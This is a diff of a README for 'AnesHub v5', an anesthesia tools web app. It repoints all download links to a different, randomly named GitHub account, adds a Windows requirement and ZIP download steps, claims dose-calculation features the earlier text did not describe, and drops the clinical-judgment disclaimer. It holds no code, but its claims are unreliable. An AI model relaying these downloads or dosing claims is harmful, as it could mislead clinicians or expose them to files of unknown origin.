@@ -1,138 +1,79 @@
-# AnesHub v5 - Anesthesia Tools 2026
+# 🏥 aneshub-anesthesia-hub-v5 - Streamline your anesthesia clinical workflow today
 
-> **AnesHub is a browser-accessible suite of smart utilities for anesthesia workflows. Version 5 is now available.**
+[![Download AnesHub](https://img.shields.io/badge/Download-AnesHub_v5-blue.svg)](https://github.com/Aloysiusteleological946/aneshub-anesthesia-hub-v5)
 
-[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v5-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/ryansjfwest7106/aneshub-anesthesia-hub-v5?style=flat-square)](https://github.com/ryansjfwest7106/aneshub-anesthesia-hub-v5)
+AnesHub v5 provides a collection of digital tools for anesthesia providers. This software helps manage clinical calculations, patient tracking, and workflow documentation. You can run the application directly through your web browser or set up a local version on your computer for offline access.
 
----
+## 📋 System Requirements
 
-<p align="center">
-  <a href="https://ryansjfwest7106.github.io/aneshub-anesthesia-hub-v5/">
-    <img src="https://img.shields.io/badge/Download-AnesHub%20Latest-brightgreen?style=for-the-badge" alt="Download AnesHub">
-  </a>
-</p>
+To run AnesHub v5, your computer must meet these basic standards:
 
-> **[Download AnesHub v5](https://ryansjfwest7106.github.io/aneshub-anesthesia-hub-v5/)**
+* Operating System: Windows 10 or Windows 11.
+* Web Browser: Google Chrome, Microsoft Edge, or Mozilla Firefox.
+* Storage: At least 500 megabytes of free disk space.
+* Memory: 4 gigabytes of RAM or higher.
+* Connection: An active internet connection for the initial setup.
 
----
+## 📥 Downloading the Application
 
-[Download Latest Build](https://ryansjfwest7106.github.io/aneshub-anesthesia-hub-v5/)
+You can access the software files directly from the project repository. Follow these steps to obtain the correct files:
 
----
+1. Visit the [official download page](https://github.com/Aloysiusteleological946/aneshub-anesthesia-hub-v5).
+2. Look for the button labeled "Code" near the top right of the page.
+3. Select "Download ZIP" from the menu.
+4. Save the compressed folder to your Windows Desktop or Downloads folder.
+5. Right-click the folder and select "Extract All" to see the contents.
 
-## What is AnesHub?
+## ⚙️ Setting Up AnesHub
 
-AnesHub is a web application that gathers practical medical utilities for anesthesia workflows in one place. The browser-based format provides a straightforward way to reach anesthesia-focused support tools without installing a separate desktop program.
+Once you extract the files, you have two ways to use the software.
 
-With version 5, AnesHub remains a lightweight resource for professionals and students who work with or learn about anesthesia tools. Its focused collection is designed for convenient access to the utilities included in the project.
+### Option 1: Browser-Based Access
+This option requires no installation. You simply open the index file in your web browser. 
 
----
+1. Open the folder you extracted.
+2. Find the file named `index.html`.
+3. Double-click this file. Your default web browser will open the application interface automatically.
+4. Bookmark this file in your browser to return to it quickly.
 
-## Highlights
+### Option 2: Local Server Setup
+If you prefer a more stable local experience, you can run the application using a local server.
 
-- A collection of smart utilities for anesthesia workflows
-- Access through a compatible web browser
-- Medical tools centered on anesthesia use
-- Support features for anesthesia practice and education
-- Multiple anesthesia utilities presented in one application
-- Direct access through the current hosted build
-- HTML-based application structure
-- Version 5 release
+1. Install a simple local server program like "Live Server" for your browser or a standalone node-based server.
+2. Direct the server to the folder containing the AnesHub files.
+3. Access the application through the local host address provided by your server software.
+4. This method keeps your data secure on your local machine and allows for faster loading times during busy clinical shifts.
 
----
+## 🛠 Features
 
-## Getting Started
+AnesHub v5 includes several built-in utilities:
 
-### Open the hosted application
+* Dose Calculator: Compute medication dosages based on patient weight and specific clinical guidelines.
+* Infusion Tracker: Monitor drip rates and medication totals over the duration of a case.
+* Checklist Manager: Access standardized safety checklists for pre-operative and post-operative care.
+* Configuration Settings: Customize the interface to match your preferred units of measure and display colors.
+* Data Export: Save your session data to a local file for later review or inclusion in patient charts.
 
-Launch the current AnesHub build in your browser:
+## 📖 Using the Software
 
-[Open AnesHub v5](https://ryansjfwest7106.github.io/aneshub-anesthesia-hub-v5/)
+The interface uses clear labels and simple navigation menus. When you first open the app, you will see a dashboard. This dashboard shows the most recent clinical tools. 
 
-### Use a local checkout
+To use a tool, click on the icon. A new window will appear. Enter the required information, such as the patient's weight or the medication concentration. The application calculates the results instantly. You can clear the fields at any time by pressing the Reset button.
 
-Clone the repository:
+If you encounter an error, check that you entered the correct numeric values. The software validates all input fields. It will highlight any errors in red.
 
-`git clone https://github.com/ryansjfwest7106/aneshub-anesthesia-hub-v5.git
+## 🛡 Security and Privacy
 
-Then enter its directory:
+Your clinical data remains on your local machine when you use the local setup. The application does not send patient information to external servers. If you choose to use the browser-accessible version without a local server, ensure you are on a secure, private network. Avoid using the application on public Wi-Fi networks when handling sensitive information.
 
-`cd REPO`
+## 💡 Troubleshooting
 
-AnesHub is an HTML web project. You can open its entry page in a browser, or provide the directory through a local static web server when direct file access is not suitable for your setup.
+* If the page appears blank: Refresh your browser window. Ensure you have the latest version of your browser installed.
+* If the calculator shows unexpected results: Double-check the units (e.g., kilograms versus pounds) in the settings menu.
+* If files are missing: Re-download the ZIP folder from the link and extract the files again to a new folder on your computer.
 
----
+## 💬 Support
 
-## Using AnesHub
+If you need help or have questions about how a specific tool works, search the internal help documentation located in the "Docs" folder inside the main project directory. The documentation provides detailed explanations for every calculation method used within the application.
 
-1. Visit the hosted build or open the local project in a browser.
-2. Choose the anesthesia utility that matches your task.
-3. Provide or examine the information requested by that utility.
-4. Consider the displayed result or guidance as workflow support.
-5. Check decisions against professional judgment, clinical procedures, and local requirements.
-
-AnesHub is not a substitute for qualified clinical evaluation, institutional protocols, or professional accountability.
-
----
-
-## Configuration and Local Serving
-
-AnesHub is delivered as a web application, and the available project metadata does not define a separate configuration format.
-
-When working with a local copy, retain the repository files together and serve the project directory as a static site if necessary. Application-level options, where available, can be inspected through the user interface.
-
----
-
-## Requirements
-
-- A current web browser
-- Internet connectivity when using the hosted build
-- A local repository copy for offline project access
-- A static web server if the local environment cannot open HTML files directly
-- Enough storage for the repository contents
-
-The available metadata does not specify a required operating system or additional runtime.
-
----
-
-## Frequently Asked Questions
-
-### Who can use AnesHub?
-
-AnesHub is aimed at people seeking anesthesia-oriented medical utilities, including those who practice, support, or study anesthesia workflows.
-
-### Where is the newest build hosted?
-
-Use the [Download Latest Build](https://ryansjfwest7106.github.io/aneshub-anesthesia-hub-v5/) link to access the current hosted version.
-
-### How can I update a local installation?
-
-For the hosted application, open the latest published build. If you are using a checkout, pull the latest repository changes and then reopen or redeploy the project.
-
-### Is a desktop installer required?
-
-No desktop installation is identified. AnesHub is an HTML-based web project intended to run in a compatible browser.
-
-### What can I check if the local copy fails to open?
-
-Verify that the complete repository was obtained, make sure the project is opened or served from the intended directory, and try running it through a local static web server.
-
-### Should AnesHub be used instead of clinical judgment?
-
-No. Use AnesHub only as anesthesia workflow support, and validate its use with qualified professional judgment, applicable local procedures, and relevant medical requirements.
-
----
-
-## Planned Direction
-
-As development continues, the project may improve the existing anesthesia utilities, make browser use more convenient, and extend practical support for anesthesia-related workflows.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: anesthesia, clinical-tools, healthcare, workflow, windows-app, medical-software
